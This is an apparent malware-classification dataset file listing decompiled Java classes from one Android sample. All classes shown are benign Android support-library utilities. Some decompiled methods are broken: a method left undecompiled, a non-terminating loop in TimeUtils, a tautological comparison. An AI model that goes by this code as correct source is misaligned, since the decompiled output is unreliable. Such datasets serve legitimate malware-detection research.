"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.net\HoneycombMR2ConnectivityManagerCompatImpl.code","static class HoneycombMR2ConnectivityManagerCompatImpl implements ConnectivityManagerCompatImpl {   HoneycombMR2ConnectivityManagerCompatImpl(){   }   @Override public boolean isActiveNetworkMetered(  ConnectivityManager cm){     return ConnectivityManagerCompatHoneycombMR2.isActiveNetworkMetered(cm);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.net\IcsTrafficStatsCompatImpl.code","static class IcsTrafficStatsCompatImpl implements TrafficStatsCompatImpl {   IcsTrafficStatsCompatImpl(){   }   @Override public void clearThreadStatsTag(){     TrafficStatsCompatIcs.clearThreadStatsTag();   }   @Override public int getThreadStatsTag(){     return TrafficStatsCompatIcs.getThreadStatsTag();   }   @Override public void incrementOperationCount(  int operationCount){     TrafficStatsCompatIcs.incrementOperationCount(operationCount);   }   @Override public void incrementOperationCount(  int tag,  int operationCount){     TrafficStatsCompatIcs.incrementOperationCount(tag,operationCount);   }   @Override public void setThreadStatsTag(  int tag){     TrafficStatsCompatIcs.setThreadStatsTag(tag);   }   @Override public void tagSocket(  Socket socket) throws SocketException {     TrafficStatsCompatIcs.tagSocket(socket);   }   @Override public void untagSocket(  Socket socket) throws SocketException {     TrafficStatsCompatIcs.untagSocket(socket);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.net\JellyBeanConnectivityManagerCompatImpl.code","static class JellyBeanConnectivityManagerCompatImpl implements ConnectivityManagerCompatImpl {   JellyBeanConnectivityManagerCompatImpl(){   }   @Override public boolean isActiveNetworkMetered(  ConnectivityManager cm){     return ConnectivityManagerCompatJellyBean.isActiveNetworkMetered(cm);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.net\SocketTags.code","public static class SocketTags {   public int statsTag;   private SocketTags(){     this.statsTag=-1;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.net\TrafficStatsCompat.code","public class TrafficStatsCompat {   private static final TrafficStatsCompatImpl IMPL; interface TrafficStatsCompatImpl {     void clearThreadStatsTag();     int getThreadStatsTag();     void incrementOperationCount(    int i);     void incrementOperationCount(    int i,    int i2);     void setThreadStatsTag(    int i);     void tagSocket(    Socket socket) throws SocketException ;     void untagSocket(    Socket socket) throws SocketException ;   } static class BaseTrafficStatsCompatImpl implements TrafficStatsCompatImpl {     private ThreadLocal<SocketTags> mThreadSocketTags=new ThreadLocal<SocketTags>(){       @Override public SocketTags initialValue(){         return new SocketTags();       }     } ; public static class SocketTags {       public int statsTag;       private SocketTags(){         this.statsTag=-1;       }     }     BaseTrafficStatsCompatImpl(){     }     @Override public void clearThreadStatsTag(){       this.mThreadSocketTags.get().statsTag=-1;     }     @Override public int getThreadStatsTag(){       return this.mThreadSocketTags.get().statsTag;     }     @Override public void incrementOperationCount(    int operationCount){     }     @Override public void incrementOperationCount(    int tag,    int operationCount){     }     @Override public void setThreadStatsTag(    int tag){       this.mThreadSocketTags.get().statsTag=tag;     }     @Override public void tagSocket(    Socket socket){     }     @Override public void untagSocket(    Socket socket){     }   } static class IcsTrafficStatsCompatImpl implements TrafficStatsCompatImpl {     IcsTrafficStatsCompatImpl(){     }     @Override public void clearThreadStatsTag(){       TrafficStatsCompatIcs.clearThreadStatsTag();     }     @Override public int getThreadStatsTag(){       return TrafficStatsCompatIcs.getThreadStatsTag();     }     @Override public void incrementOperationCount(    int operationCount){       TrafficStatsCompatIcs.incrementOperationCount(operationCount);     }     @Override public void incrementOperationCount(    int tag,    int operationCount){       TrafficStatsCompatIcs.incrementOperationCount(tag,operationCount);     }     @Override public void setThreadStatsTag(    int tag){       TrafficStatsCompatIcs.setThreadStatsTag(tag);     }     @Override public void tagSocket(    Socket socket) throws SocketException {       TrafficStatsCompatIcs.tagSocket(socket);     }     @Override public void untagSocket(    Socket socket) throws SocketException {       TrafficStatsCompatIcs.untagSocket(socket);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new IcsTrafficStatsCompatImpl();     }  else {       IMPL=new BaseTrafficStatsCompatImpl();     }   }   public static void clearThreadStatsTag(){     IMPL.clearThreadStatsTag();   }   public static int getThreadStatsTag(){     return IMPL.getThreadStatsTag();   }   public static void incrementOperationCount(  int operationCount){     IMPL.incrementOperationCount(operationCount);   }   public static void incrementOperationCount(  int tag,  int operationCount){     IMPL.incrementOperationCount(tag,operationCount);   }   public static void setThreadStatsTag(  int tag){     IMPL.setThreadStatsTag(tag);   }   public static void tagSocket(  Socket socket) throws SocketException {     IMPL.tagSocket(socket);   }   public static void untagSocket(  Socket socket) throws SocketException {     IMPL.untagSocket(socket);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.net\TrafficStatsCompatIcs.code","public class TrafficStatsCompatIcs {   public static void clearThreadStatsTag(){     TrafficStats.clearThreadStatsTag();   }   public static int getThreadStatsTag(){     return TrafficStats.getThreadStatsTag();   }   public static void incrementOperationCount(  int operationCount){     TrafficStats.incrementOperationCount(operationCount);   }   public static void incrementOperationCount(  int tag,  int operationCount){     TrafficStats.incrementOperationCount(tag,operationCount);   }   public static void setThreadStatsTag(  int tag){     TrafficStats.setThreadStatsTag(tag);   }   public static void tagSocket(  Socket socket) throws SocketException {     TrafficStats.tagSocket(socket);   }   public static void untagSocket(  Socket socket) throws SocketException {     TrafficStats.untagSocket(socket);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.net\TrafficStatsCompatImpl.code","interface TrafficStatsCompatImpl {   void clearThreadStatsTag();   int getThreadStatsTag();   void incrementOperationCount(  int i);   void incrementOperationCount(  int i,  int i2);   void setThreadStatsTag(  int i);   void tagSocket(  Socket socket) throws SocketException ;   void untagSocket(  Socket socket) throws SocketException ; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.os\CompatCreator.code","static class CompatCreator<T> implements Parcelable.Creator<T> {   final ParcelableCompatCreatorCallbacks<T> mCallbacks;   public CompatCreator(  ParcelableCompatCreatorCallbacks<T> callbacks){     this.mCallbacks=callbacks;   }   @Override public T createFromParcel(  Parcel source){     return this.mCallbacks.createFromParcel(source,null);   }   @Override public T[] newArray(  int size){     return this.mCallbacks.newArray(size);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.os\ParcelableCompat.code","public class ParcelableCompat {   public static <T>Parcelable.Creator<T> newCreator(  ParcelableCompatCreatorCallbacks<T> callbacks){     if (Build.VERSION.SDK_INT >= 13) {       ParcelableCompatCreatorHoneycombMR2Stub.instantiate(callbacks);     }     return new CompatCreator(callbacks);   } static class CompatCreator<T> implements Parcelable.Creator<T> {     final ParcelableCompatCreatorCallbacks<T> mCallbacks;     public CompatCreator(    ParcelableCompatCreatorCallbacks<T> callbacks){       this.mCallbacks=callbacks;     }     @Override public T createFromParcel(    Parcel source){       return this.mCallbacks.createFromParcel(source,null);     }     @Override public T[] newArray(    int size){       return this.mCallbacks.newArray(size);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.os\ParcelableCompatCreatorCallbacks.code","public interface ParcelableCompatCreatorCallbacks<T> {   T createFromParcel(  Parcel parcel,  ClassLoader classLoader);   T[] newArray(  int i); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.os\ParcelableCompatCreatorHoneycombMR2.code","class ParcelableCompatCreatorHoneycombMR2<T> implements Parcelable.ClassLoaderCreator<T> {   private final ParcelableCompatCreatorCallbacks<T> mCallbacks;   public ParcelableCompatCreatorHoneycombMR2(  ParcelableCompatCreatorCallbacks<T> callbacks){     this.mCallbacks=callbacks;   }   @Override public T createFromParcel(  Parcel in){     return this.mCallbacks.createFromParcel(in,null);   }   @Override public T createFromParcel(  Parcel in,  ClassLoader loader){     return this.mCallbacks.createFromParcel(in,loader);   }   @Override public T[] newArray(  int size){     return this.mCallbacks.newArray(size);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.os\ParcelableCompatCreatorHoneycombMR2Stub.code","class ParcelableCompatCreatorHoneycombMR2Stub {   ParcelableCompatCreatorHoneycombMR2Stub(){   }   public static <T>Parcelable.Creator<T> instantiate(  ParcelableCompatCreatorCallbacks<T> callbacks){     return new ParcelableCompatCreatorHoneycombMR2(callbacks);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.util\AtomicFile.code","public class AtomicFile {   private final File mBackupName;   private final File mBaseName;   public AtomicFile(  File baseName){     this.mBaseName=baseName;     this.mBackupName=new File(baseName.getPath() + "".bak"");   }   public File getBaseFile(){     return this.mBaseName;   }   public void delete(){     this.mBaseName.delete();     this.mBackupName.delete();   }   public FileOutputStream startWrite() throws IOException {     if (this.mBaseName.exists()) {       if (!this.mBackupName.exists()) {         if (!this.mBaseName.renameTo(this.mBackupName)) {           Log.w(""AtomicFile"",""Couldn't rename file "" + this.mBaseName + "" to backup file ""+ this.mBackupName);         }       }  else {         this.mBaseName.delete();       }     }     try {       FileOutputStream str=new FileOutputStream(this.mBaseName);       return str;     }  catch (    FileNotFoundException e) {       File parent=this.mBaseName.getParentFile();       if (!parent.mkdir()) {         throw new IOException(""Couldn't create directory "" + this.mBaseName);       }       try {         FileOutputStream str2=new FileOutputStream(this.mBaseName);         return str2;       }  catch (      FileNotFoundException e2) {         throw new IOException(""Couldn't create "" + this.mBaseName);       }     }   }   public void finishWrite(  FileOutputStream str){     if (str != null) {       sync(str);       try {         str.close();         this.mBackupName.delete();       }  catch (      IOException e) {         Log.w(""AtomicFile"",""finishWrite: Got exception:"",e);       }     }   }   public void failWrite(  FileOutputStream str){     if (str != null) {       sync(str);       try {         str.close();         this.mBaseName.delete();         this.mBackupName.renameTo(this.mBaseName);       }  catch (      IOException e) {         Log.w(""AtomicFile"",""failWrite: Got exception:"",e);       }     }   }   public FileInputStream openRead() throws FileNotFoundException {     if (this.mBackupName.exists()) {       this.mBaseName.delete();       this.mBackupName.renameTo(this.mBaseName);     }     return new FileInputStream(this.mBaseName);   }   public byte[] readFully() throws IOException {     FileInputStream stream=openRead();     int pos=0;     try {       byte[] data=new byte[stream.available()];       while (true) {         int amt=stream.read(data,pos,data.length - pos);         if (amt <= 0) {           return data;         }         pos+=amt;         int avail=stream.available();         if (avail > data.length - pos) {           byte[] newData=new byte[pos + avail];           System.arraycopy(data,0,newData,0,pos);           data=newData;         }       }     }   finally {       stream.close();     }   }   static boolean sync(  FileOutputStream stream){     if (stream != null) {       try {         stream.getFD().sync();       }  catch (      IOException e) {         return false;       }     }     return true;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.util\DebugUtils.code","public class DebugUtils {   public static void buildShortClassTag(  Object cls,  StringBuilder out){     int end;     if (cls == null) {       out.append(""null"");       return;     }     String simpleName=cls.getClass().getSimpleName();     if ((simpleName == null || simpleName.length() <= 0) && (end=(simpleName=cls.getClass().getName()).lastIndexOf(46)) > 0) {       simpleName=simpleName.substring(end + 1);     }     out.append(simpleName);     out.append('{');     out.append(Integer.toHexString(System.identityHashCode(cls)));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.util\LogWriter.code","public class LogWriter extends Writer {   private StringBuilder mBuilder=new StringBuilder(128);   private final String mTag;   public LogWriter(  String tag){     this.mTag=tag;   }   @Override public void close(){     flushBuilder();   }   @Override public void flush(){     flushBuilder();   }   @Override public void write(  char[] buf,  int offset,  int count){     for (int i=0; i < count; i++) {       char c=buf[offset + i];       if (c == '\n') {         flushBuilder();       }  else {         this.mBuilder.append(c);       }     }   }   private void flushBuilder(){     if (this.mBuilder.length() > 0) {       Log.d(this.mTag,this.mBuilder.toString());       this.mBuilder.delete(0,this.mBuilder.length());     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.util\LongSparseArray.code","public class LongSparseArray<E> implements Cloneable {   private static final Object DELETED=new Object();   private boolean mGarbage;   private long[] mKeys;   private int mSize;   private Object[] mValues;   public LongSparseArray(){     this(10);   }   public LongSparseArray(  int initialCapacity){     this.mGarbage=false;     int initialCapacity2=idealLongArraySize(initialCapacity);     this.mKeys=new long[initialCapacity2];     this.mValues=new Object[initialCapacity2];     this.mSize=0;   }   public LongSparseArray<E> m0clone(){     LongSparseArray<E> clone=null;     try {       clone=(LongSparseArray)super.clone();       clone.mKeys=(long[])this.mKeys.clone();       clone.mValues=(Object[])this.mValues.clone();       return clone;     }  catch (    CloneNotSupportedException e) {       return clone;     }   }   public E get(  long key){     return get(key,null);   }   public E get(  long j,  E e){     int binarySearch=binarySearch(this.mKeys,0,this.mSize,j);     return (binarySearch < 0 || this.mValues[binarySearch] == DELETED) ? e : (E)this.mValues[binarySearch];   }   public void delete(  long key){     int i=binarySearch(this.mKeys,0,this.mSize,key);     if (i >= 0 && this.mValues[i] != DELETED) {       this.mValues[i]=DELETED;       this.mGarbage=true;     }   }   public void remove(  long key){     delete(key);   }   public void removeAt(  int index){     if (this.mValues[index] != DELETED) {       this.mValues[index]=DELETED;       this.mGarbage=true;     }   }   private void gc(){     int n=this.mSize;     int o=0;     long[] keys=this.mKeys;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       Object val=values[i];       if (val != DELETED) {         if (i != o) {           keys[o]=keys[i];           values[o]=val;           values[i]=null;         }         o++;       }     }     this.mGarbage=false;     this.mSize=o;   }   public void put(  long key,  E value){     int i=binarySearch(this.mKeys,0,this.mSize,key);     if (i >= 0) {       this.mValues[i]=value;       return;     }     int i2=i ^ (-1);     if (i2 < this.mSize && this.mValues[i2] == DELETED) {       this.mKeys[i2]=key;       this.mValues[i2]=value;       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();       i2=binarySearch(this.mKeys,0,this.mSize,key) ^ (-1);     }     if (this.mSize >= this.mKeys.length) {       int n=idealLongArraySize(this.mSize + 1);       long[] nkeys=new long[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     if (this.mSize - i2 != 0) {       System.arraycopy(this.mKeys,i2,this.mKeys,i2 + 1,this.mSize - i2);       System.arraycopy(this.mValues,i2,this.mValues,i2 + 1,this.mSize - i2);     }     this.mKeys[i2]=key;     this.mValues[i2]=value;     this.mSize++;   }   public int size(){     if (this.mGarbage) {       gc();     }     return this.mSize;   }   public long keyAt(  int index){     if (this.mGarbage) {       gc();     }     return this.mKeys[index];   }   public E valueAt(  int i){     if (this.mGarbage) {       gc();     }     return (E)this.mValues[i];   }   public void setValueAt(  int index,  E value){     if (this.mGarbage) {       gc();     }     this.mValues[index]=value;   }   public int indexOfKey(  long key){     if (this.mGarbage) {       gc();     }     return binarySearch(this.mKeys,0,this.mSize,key);   }   public int indexOfValue(  E value){     if (this.mGarbage) {       gc();     }     for (int i=0; i < this.mSize; i++) {       if (this.mValues[i] == value) {         return i;       }     }     return -1;   }   public void clear(){     int n=this.mSize;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       values[i]=null;     }     this.mSize=0;     this.mGarbage=false;   }   public void append(  long key,  E value){     if (this.mSize != 0 && key <= this.mKeys[this.mSize - 1]) {       put(key,value);       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();     }     int pos=this.mSize;     if (pos >= this.mKeys.length) {       int n=idealLongArraySize(pos + 1);       long[] nkeys=new long[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     this.mKeys[pos]=key;     this.mValues[pos]=value;     this.mSize=pos + 1;   }   private static int binarySearch(  long[] a,  int start,  int len,  long key){     int high=start + len;     int low=start - 1;     while (high - low > 1) {       int guess=(high + low) / 2;       if (a[guess] < key) {         low=guess;       }  else {         high=guess;       }     }     if (high != start + len) {       return a[high] != key ? high ^ (-1) : high;     }     int high2=(start + len) ^ (-1);     return high2;   }   public static int idealByteArraySize(  int need){     for (int i=4; i < 32; i++) {       if (need <= (1 << i) - 12) {         return (1 << i) - 12;       }     }     return need;   }   public static int idealLongArraySize(  int need){     return idealByteArraySize(need * 8) / 8;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.util\LruCache.code","public class LruCache<K,V> {   private int createCount;   private int evictionCount;   private int hitCount;   private final LinkedHashMap<K,V> map;   private int maxSize;   private int missCount;   private int putCount;   private int size;   public LruCache(  int maxSize){     if (maxSize <= 0) {       throw new IllegalArgumentException(""maxSize <= 0"");     }     this.maxSize=maxSize;     this.map=new LinkedHashMap<>(0,0.75f,true);   }   public final V get(  K k){     V v;     if (k == null) {       throw new NullPointerException(""key == null"");     } synchronized (this) {       V v2=this.map.get(k);       if (v2 != null) {         this.hitCount++;         return v2;       }       this.missCount++;       V create=create(k);       if (create == null) {         return null;       } synchronized (this) {         this.createCount++;         v=(V)this.map.put(k,create);         if (v != null) {           this.map.put(k,v);         }  else {           this.size+=safeSizeOf(k,create);         }       }       if (v != null) {         entryRemoved(false,k,create,v);         return v;       }       trimToSize(this.maxSize);       return create;     }   }   public final V put(  K key,  V value){     V previous;     if (key == null || value == null) {       throw new NullPointerException(""key == null || value == null"");     } synchronized (this) {       this.putCount++;       this.size+=safeSizeOf(key,value);       previous=this.map.put(key,value);       if (previous != null) {         this.size-=safeSizeOf(key,previous);       }     }     if (previous != null) {       entryRemoved(false,key,previous,value);     }     trimToSize(this.maxSize);     return previous;   }   public void trimToSize(  int r7){     throw new UnsupportedOperationException(""Method not decompiled: android.support.v4.util.LruCache.trimToSize(int):void"");   }   public final V remove(  K key){     V previous;     if (key == null) {       throw new NullPointerException(""key == null"");     } synchronized (this) {       previous=this.map.remove(key);       if (previous != null) {         this.size-=safeSizeOf(key,previous);       }     }     if (previous != null) {       entryRemoved(false,key,previous,null);     }     return previous;   }   protected void entryRemoved(  boolean evicted,  K key,  V oldValue,  V newValue){   }   protected V create(  K key){     return null;   }   private int safeSizeOf(  K key,  V value){     int result=sizeOf(key,value);     if (result < 0) {       throw new IllegalStateException(""Negative size: "" + key + ""=""+ value);     }     return result;   }   protected int sizeOf(  K key,  V value){     return 1;   }   public final void evictAll(){     trimToSize(-1);   }   public final synchronized int size(){     return this.size;   }   public final synchronized int maxSize(){     return this.maxSize;   }   public final synchronized int hitCount(){     return this.hitCount;   }   public final synchronized int missCount(){     return this.missCount;   }   public final synchronized int createCount(){     return this.createCount;   }   public final synchronized int putCount(){     return this.putCount;   }   public final synchronized int evictionCount(){     return this.evictionCount;   }   public final synchronized Map<K,V> snapshot(){     return new LinkedHashMap(this.map);   }   public final synchronized String toString(){     String format; synchronized (this) {       int accesses=this.hitCount + this.missCount;       int hitPercent=accesses != 0 ? (this.hitCount * 100) / accesses : 0;       format=String.format(""LruCache[maxSize=%d,hits=%d,misses=%d,hitRate=%d%%]"",Integer.valueOf(this.maxSize),Integer.valueOf(this.hitCount),Integer.valueOf(this.missCount),Integer.valueOf(hitPercent));     }     return format;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.util\SparseArrayCompat.code","public class SparseArrayCompat<E> {   private static final Object DELETED=new Object();   private boolean mGarbage;   private int[] mKeys;   private int mSize;   private Object[] mValues;   public SparseArrayCompat(){     this(10);   }   public SparseArrayCompat(  int initialCapacity){     this.mGarbage=false;     int initialCapacity2=idealIntArraySize(initialCapacity);     this.mKeys=new int[initialCapacity2];     this.mValues=new Object[initialCapacity2];     this.mSize=0;   }   public E get(  int key){     return get(key,null);   }   public E get(  int i,  E e){     int binarySearch=binarySearch(this.mKeys,0,this.mSize,i);     return (binarySearch < 0 || this.mValues[binarySearch] == DELETED) ? e : (E)this.mValues[binarySearch];   }   public void delete(  int key){     int i=binarySearch(this.mKeys,0,this.mSize,key);     if (i >= 0 && this.mValues[i] != DELETED) {       this.mValues[i]=DELETED;       this.mGarbage=true;     }   }   public void remove(  int key){     delete(key);   }   public void removeAt(  int index){     if (this.mValues[index] != DELETED) {       this.mValues[index]=DELETED;       this.mGarbage=true;     }   }   public void removeAtRange(  int index,  int size){     int end=Math.min(this.mSize,index + size);     for (int i=index; i < end; i++) {       removeAt(i);     }   }   private void gc(){     int n=this.mSize;     int o=0;     int[] keys=this.mKeys;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       Object val=values[i];       if (val != DELETED) {         if (i != o) {           keys[o]=keys[i];           values[o]=val;         }         o++;       }     }     this.mGarbage=false;     this.mSize=o;   }   public void put(  int key,  E value){     int i=binarySearch(this.mKeys,0,this.mSize,key);     if (i >= 0) {       this.mValues[i]=value;       return;     }     int i2=i ^ (-1);     if (i2 < this.mSize && this.mValues[i2] == DELETED) {       this.mKeys[i2]=key;       this.mValues[i2]=value;       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();       i2=binarySearch(this.mKeys,0,this.mSize,key) ^ (-1);     }     if (this.mSize >= this.mKeys.length) {       int n=idealIntArraySize(this.mSize + 1);       int[] nkeys=new int[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     if (this.mSize - i2 != 0) {       System.arraycopy(this.mKeys,i2,this.mKeys,i2 + 1,this.mSize - i2);       System.arraycopy(this.mValues,i2,this.mValues,i2 + 1,this.mSize - i2);     }     this.mKeys[i2]=key;     this.mValues[i2]=value;     this.mSize++;   }   public int size(){     if (this.mGarbage) {       gc();     }     return this.mSize;   }   public int keyAt(  int index){     if (this.mGarbage) {       gc();     }     return this.mKeys[index];   }   public E valueAt(  int i){     if (this.mGarbage) {       gc();     }     return (E)this.mValues[i];   }   public void setValueAt(  int index,  E value){     if (this.mGarbage) {       gc();     }     this.mValues[index]=value;   }   public int indexOfKey(  int key){     if (this.mGarbage) {       gc();     }     return binarySearch(this.mKeys,0,this.mSize,key);   }   public int indexOfValue(  E value){     if (this.mGarbage) {       gc();     }     for (int i=0; i < this.mSize; i++) {       if (this.mValues[i] == value) {         return i;       }     }     return -1;   }   public void clear(){     int n=this.mSize;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       values[i]=null;     }     this.mSize=0;     this.mGarbage=false;   }   public void append(  int key,  E value){     if (this.mSize != 0 && key <= this.mKeys[this.mSize - 1]) {       put(key,value);       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();     }     int pos=this.mSize;     if (pos >= this.mKeys.length) {       int n=idealIntArraySize(pos + 1);       int[] nkeys=new int[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     this.mKeys[pos]=key;     this.mValues[pos]=value;     this.mSize=pos + 1;   }   private static int binarySearch(  int[] a,  int start,  int len,  int key){     int high=start + len;     int low=start - 1;     while (high - low > 1) {       int guess=(high + low) / 2;       if (a[guess] < key) {         low=guess;       }  else {         high=guess;       }     }     if (high != start + len) {       return a[high] != key ? high ^ (-1) : high;     }     int high2=(start + len) ^ (-1);     return high2;   }   static int idealByteArraySize(  int need){     for (int i=4; i < 32; i++) {       if (need <= (1 << i) - 12) {         return (1 << i) - 12;       }     }     return need;   }   static int idealIntArraySize(  int need){     return idealByteArraySize(need * 4) / 4;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.util\TimeUtils.code","public class TimeUtils {   public static final int HUNDRED_DAY_FIELD_LEN=19;   private static final int SECONDS_PER_DAY=86400;   private static final int SECONDS_PER_HOUR=3600;   private static final int SECONDS_PER_MINUTE=60;   private static final Object sFormatSync=new Object();   private static char[] sFormatStr=new char[24];   private static int accumField(  int amt,  int suffix,  boolean always,  int zeropad){     if (amt > 99 || (always && zeropad >= 3)) {       return suffix + 3;     }     if (amt > 9 || (always && zeropad >= 2)) {       return suffix + 2;     }     if (always || amt > 0) {       return suffix + 1;     }     return 0;   }   private static int printField(  char[] formatStr,  int amt,  char suffix,  int pos,  boolean always,  int zeropad){     if (always || amt > 0) {       if ((always && zeropad >= 3) || amt > 99) {         int dig=amt / 100;         formatStr[pos]=(char)(dig + 48);         pos++;         amt-=dig * 100;       }       if ((always && zeropad >= 2) || amt > 9 || pos != pos) {         int dig2=amt / 10;         formatStr[pos]=(char)(dig2 + 48);         pos++;         amt-=dig2 * 10;       }       formatStr[pos]=(char)(amt + 48);       int pos2=pos + 1;       formatStr[pos2]=suffix;       return pos2 + 1;     }     return pos;   }   private static int formatDurationLocked(  long duration,  int fieldLen){     char prefix;     if (sFormatStr.length < fieldLen) {       sFormatStr=new char[fieldLen];     }     char[] formatStr=sFormatStr;     if (duration == 0) {       int fieldLen2=fieldLen - 1;       while (0 < fieldLen2) {         formatStr[0]=' ';       }       formatStr[0]='0';       return 1;     }     if (duration > 0) {       prefix='+';     }  else {       prefix='-';       duration=-duration;     }     int millis=(int)(duration % 1000);     int seconds=(int)Math.floor(duration / 1000);     int days=0;     int hours=0;     int minutes=0;     if (seconds > SECONDS_PER_DAY) {       days=seconds / SECONDS_PER_DAY;       seconds-=SECONDS_PER_DAY * days;     }     if (seconds > SECONDS_PER_HOUR) {       hours=seconds / SECONDS_PER_HOUR;       seconds-=hours * SECONDS_PER_HOUR;     }     if (seconds > SECONDS_PER_MINUTE) {       minutes=seconds / SECONDS_PER_MINUTE;       seconds-=minutes * SECONDS_PER_MINUTE;     }     int pos=0;     if (fieldLen != 0) {       int myLen=accumField(days,1,false,0);       int myLen2=myLen + accumField(hours,1,myLen > 0,2);       int myLen3=myLen2 + accumField(minutes,1,myLen2 > 0,2);       int myLen4=myLen3 + accumField(seconds,1,myLen3 > 0,2);       for (int myLen5=myLen4 + accumField(millis,2,true,myLen4 > 0 ? 3 : 0) + 1; myLen5 < fieldLen; myLen5++) {         formatStr[pos]=' ';         pos++;       }     }     formatStr[pos]=prefix;     int pos2=pos + 1;     boolean zeropad=fieldLen != 0;     int pos3=printField(formatStr,days,'d',pos2,false,0);     int pos4=printField(formatStr,hours,'h',pos3,pos3 != pos2,zeropad ? 2 : 0);     int pos5=printField(formatStr,minutes,'m',pos4,pos4 != pos2,zeropad ? 2 : 0);     int pos6=printField(formatStr,seconds,'s',pos5,pos5 != pos2,zeropad ? 2 : 0);     int pos7=printField(formatStr,millis,'m',pos6,true,(!zeropad || pos6 == pos2) ? 0 : 3);     formatStr[pos7]='s';     return pos7 + 1;   }   public static void formatDuration(  long duration,  StringBuilder builder){ synchronized (sFormatSync) {       int len=formatDurationLocked(duration,0);       builder.append(sFormatStr,0,len);     }   }   public static void formatDuration(  long duration,  PrintWriter pw,  int fieldLen){ synchronized (sFormatSync) {       int len=formatDurationLocked(duration,fieldLen);       pw.print(new String(sFormatStr,0,len));     }   }   public static void formatDuration(  long duration,  PrintWriter pw){     formatDuration(duration,pw,0);   }   public static void formatDuration(  long time,  long now,  PrintWriter pw){     if (time == 0) {       pw.print(""--"");     }  else {       formatDuration(time - now,pw,0);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\AccessibilityDelegateBridge.code","public interface AccessibilityDelegateBridge {   boolean dispatchPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  View view,  Object obj);   void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   boolean onRequestSendAccessibilityEvent(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   void sendAccessibilityEvent(  View view,  int i);   void sendAccessibilityEventUnchecked(  View view,  AccessibilityEvent accessibilityEvent); } "
